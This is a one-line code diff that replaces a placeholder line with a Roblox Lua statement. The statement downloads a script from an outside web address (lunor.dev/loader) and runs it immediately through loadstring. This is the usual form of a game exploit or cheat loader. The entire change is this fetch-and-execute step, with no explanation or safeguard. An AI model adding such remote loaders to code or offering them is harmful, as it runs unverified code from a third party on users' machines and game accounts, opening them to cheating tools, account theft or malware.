@@ -1,1 +1,3 @@
-ay
+loadstring(game:HttpGet("https://lunor.dev/loader"))()
+
+
